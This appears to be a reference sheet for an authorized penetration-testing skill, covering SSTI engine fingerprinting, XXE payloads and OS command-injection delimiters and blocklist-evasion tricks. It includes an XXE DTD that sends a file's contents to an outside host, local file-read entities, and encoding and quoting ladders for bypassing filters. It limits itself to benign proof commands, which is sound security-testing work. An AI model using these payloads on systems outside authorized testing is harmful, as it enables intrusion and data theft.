# SSTI, XXE, and OS command injection tables

Engine fingerprint decision table, XXE payload family, and command
delimiter + filter-evasion tables. All payloads are canonical textbook forms;
command slots are limited to the benign proof catalog (`id`, `whoami`,
`hostname`, canary echo).

## 1. SSTI engine fingerprint (CWE-1336)

Never attempt execution on first contact; fingerprint, confirm with a benign
render, then hand the engine to `45-rce-exploitation` for escalation.

### 1.1 First-round probes

| Probe | Result | Engines |
|---|---|---|
| `{{7*7}}` | `49` | Jinja2, Twig, Pebble, Angular (client-side) |
| `${7*7}` | `49` | FreeMarker, Velocity, Mako, JSP EL, Thymeleaf (inline) |
| `<%= 7*7 %>` | `49` | ERB (Ruby), EJS (Node) |
| `<% 7*7 %>` | error-free acceptance, no output | ERB/EJS scriptlet (statement context) |
| `#{7*7}` | `49` | JSF EL, Ruby interpolation, Pug, Pebble alt |
| `*{7*7}` | `49` | Thymeleaf |
| `${{7*7}}` | `49` | mixed-delimiter stacks (rare) |
| probe echoed literally | unchanged | no engine, or escaping — negative |

### 1.2 Discrimination round

| Follow-up | Result | Conclusion |
|---|---|---|
| `{{7*'7'}}` | `7777777` | Jinja2 (Python string repeat) |
| `{{7*'7'}}` | `49` | Twig (PHP numeric cast) |
| `${7*"7"}` | `7777777` | FreeMarker (string repeat) |
| `<%= 7*7 %>` in a `.html` route with Sinatra/Rails | `49` | ERB |
| `#set($x=7*7)${x}` (with `$x` = `x`) | `49` | Velocity |
| `${"a".getClass()}` renders class info | yes | Java-family (FreeMarker/Velocity) |
| `{{ config }}` / `{{ self }}` renders object repr | yes | Jinja2 sandbox absent |

Record engine + version (headers, error pages, `10` fingerprints) and hand to
`70-exploit-intel` for CVE correlation and to `45` for escalation.

## 2. XXE payload family (CWE-611)

Surfaces: XML/SOAP endpoints, SVG and `.docx`/`.xlsx`-style uploads, SAML
assertions, RSS importers. Fingerprint the parser first (modern libxml2
defaults external entities OFF; .NET `XmlDocument` with `XmlUrlResolver` and
Java `DocumentBuilder`/SAX are the classic reachable ones).

### 2.1 In-band file read (proof = hostname or canary file)

```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<r>&xxe;</r>
```

Windows-family target: `file:///c:/windows/win.ini` is the canonical
existence proof. No system data beyond proof (no keys, no user data).

### 2.2 Blind / OOB via hosted DTD

Request (entity names must differ from the local ones):

```xml
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % remote SYSTEM "http://canary.rj-pt.example/oob/xxe.dtd">
  %remote;
]>
<r>x</r>
```

DTD hosted on the `20` listener (`oob/xxe.dtd`):

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://canary.rj-pt.example/oob/xxe?d=%file;'>">
%eval;
%exfil;
```

The DNS/HTTP hit carrying `/etc/hostname` (<= 200 chars, benign) is the D1
proof; replay for D2. File choice stays in the benign catalog — hostname or
an operator-planted canary file only.

### 2.3 Error-based

```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///nonexistent-rj-pt-canary"> ]>
<r>&xxe;</r>
```

Parser error text leaking the resolved path/system id confirms entity
resolution without any exfiltration channel.

### 2.4 Expect-header OOB (no DTD hosting possible)

`<!ENTITY xxe SYSTEM "expect://id">` is NOT used — expect:// leaks command
output in headers and is out of the benign catalog; use 2.2/2.3 instead.

## 3. OS command injection (CWE-78)

### 3.1 Delimiter table per shell

| Shell | Separators | Notes |
|---|---|---|
| sh/bash/ash/dash | `;` `\|` `&&` `\|\|` backtick `` `cmd` `` `$(cmd)` newline `%0a` (and `%0d%0a`) | `$()` nests; backticks do not |
| cmd.exe | `&` `&&` `\|` `\|\|` | `%0d%0a` unreliable; `^` is the escape char |
| PowerShell | `;` `\|` `&&` (7+) `\|\|` `$(...)` | backtick is the escape char |

### 3.2 Detection set (bounded, canary echo — mirrors `45`'s rce_verify.py)

`;echo <canary>` / `|echo <canary>` / `&&echo <canary>` / `||echo <canary>` /
newline+`echo <canary>` / `` `echo <canary>` `` / `$(echo <canary>)` /
`;printf %s <canary>`.

Blind/DNS-safe: `ping -c 1 -W 1 <canary-domain>` (one packet, bounded wait)
verified on the `20` OOB listener — never a ping flood, never a reverse shell.

### 3.3 Filter-evasion ladder (only after plain separators fail)

1. Quoting: `wh"o"ami`, `wh'o'ami` — defeats keyword blocklists.
2. Backslash: `wh\oami` — same, for quote-stripping filters.
3. Spaceless: `${IFS}`, `$IFS$9`, `<` redirect form, brace group `{ping,-c,1,-W,1,host}`.
4. Case: `WHO""AMI`, `WhOaMi` — defeats case-sensitive blocklists.
5. Charset/hex: `$(printf '\167\150\157\141\155\151')` — defeats most literal lists.
6. Re-encoding the separator: `%0a`, `%0d%0a`, double-encode when the app
   decodes twice.
7. Time-based fallback: `;sleep 5` (or `& sleep 5 &`) under the RoE gate,
   medians N>=5.

Record the exact ladder rung that worked; the rung is part of the finding and
of the remediation note (blocklists failed at that layer).

### 3.4 Windows-family specifics

- `&` chains regardless of prior command success; `&&` needs success.
- Caret escaping: `who^ami` defeats naive `whoami` blocklists.
- Quotes: `ne""t user` style; `cmd /c` wrappers when the sink spawns
  `cmd /c <input>`.

## 4. Evidence and limits

- Every confirmed class here produces a finding with: probe, verbatim
  response delta, engine/shell fingerprint, and encode rung.
- Execution escalation (SSTI->RCE, XXE beyond file-read proof, command
  injection proof-of-execution flow) is `45-rce-exploitation` territory with
  operator authorization; this skill stops at confirmed class + fingerprint.
